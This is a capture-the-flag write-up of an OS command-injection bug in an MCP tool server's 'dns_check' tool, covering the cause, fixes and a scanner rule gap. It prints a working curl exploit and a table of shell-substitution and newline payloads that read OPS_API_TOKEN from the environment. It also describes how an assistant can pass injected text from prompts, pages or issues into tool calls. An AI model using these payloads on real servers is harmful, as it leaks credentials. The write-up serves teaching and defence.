# ai-1 · Tool Time: writeup

**Class:** OS command injection in an MCP tool (CWE-78). OWASP LLM05 Improper Output Handling and
LLM06 Excessive Agency. Same class as CVE-2025-6514 (`mcp-remote`).

## Exploit
```bash
curl -s localhost:41301/mcp -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"dns_check","arguments":{"hostname":"$(printenv OPS_API_TOKEN)"}}}'
# could not resolve "CTF{ai-1_...}"
```

## Why it works
`exec()` runs `/bin/sh -c "node lookup.mjs <hostname>"`. The shell expands `$(...)` before node
runs, and the result becomes an argument, which the helper helpfully echoes in its error message.
The denylist blocks `; & | < >` but the shell has more ways in. Verified bypasses:

| Payload | Result on vulnerable server |
|---|---|
| `$(printenv OPS_API_TOKEN)` | flag in the "could not resolve" message |
| `` `printenv OPS_API_TOKEN` `` | same |
| `localhost` + newline + `printenv OPS_API_TOKEN` | newline is a command separator: flag on line 2 |
| `localhost $OPS_API_TOKEN` | expands, but becomes argv[3], which the helper ignores. No leak. |

## Why this is an "AI" bug
In a real deployment nobody sends this JSON by hand: an assistant does, with arguments it
derived from a prompt, a web page, or a GitHub issue. So the attacker is anyone who can put text in
front of the model (see ai-2). Treat every tool argument as attacker input.

## Fix (all three are in fixed-server.mjs)
1. Allowlist validation (RFC 1123 hostname), not a denylist.
2. No shell: `execFile(node, [script, hostname])`. Even better, call `dns.lookup` in-process.
3. Least privilege: the child gets a minimal `env`, not the server's secrets.
Verified: all four payloads above are rejected by the fixed server.

## Scanner check
**Caught.** `node-security/no-shell-injection` fires on the `exec` template literal (line 26), and
`node-security/require-secure-credential-storage` flags the token in `process.env` (line 12).
`mcp-sdk-security/no-command-injection-in-tool` did **not** fire: it targets `@modelcontextprotocol/sdk`
tool registrations, and this server speaks raw JSON-RPC. **Rule gap worth checking:** MCP servers
that don't use the SDK (hand-rolled `tools/call` dispatch).
